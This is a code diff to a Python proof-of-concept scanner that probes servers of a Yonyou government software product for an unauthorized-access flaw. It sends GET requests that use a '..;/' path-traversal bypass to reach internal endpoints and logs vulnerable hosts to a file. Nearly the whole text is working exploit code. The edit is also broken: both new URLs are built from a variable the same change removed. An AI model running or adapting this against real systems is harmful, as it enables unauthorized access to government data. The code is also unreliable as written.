@@ -35,8 +35,11 @@ def poc(target):
         target = target[:-1]
     else:
         target = target
-    path = "/pub/fe/config/..;/..;/..;/ma/asval/getAll"
-    url = target + path
+    path1 = "/pub/fe/config/..;/..;/..;/ma/asval/getAll"
+    path2 = "/pub/fe/config/..;/..;/..;/ga/riskClassify/getClassifyTree"
+    url1 = target + path
+    url2 = target + path
+	
     headers = {
         "Upgrade-Insecure-Requests": "1",
         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
@@ -53,11 +56,13 @@ def poc(target):
         # conn = http.client.HTTPConnection(target)
         # conn.request("POST", path, body.encode("utf-8"), headers)
         # response1 = conn.getresponse()
-        response1 = requests.get(url, headers=headers, verify=False, timeout=15)
+        response1 = requests.get(url=url1, headers=headers, verify=False, timeout=15)
+        response2 = requests.get(url=url2, headers=headers, verify=False, timeout=15)
+
         # print(response1.status_code)
 
 
-        if response1.status_code == 200 and "success" in response1.text:
+        if (response1.status_code == 200 and "success" in response1.text) or (response2.status_code == 200 and "success" in response2.text):
 
             print(f"[++++++] {target} 存在 用友政务A++V832产品未授权访问漏洞")
             with open("result.txt", "a+", encoding="utf-8") as f:
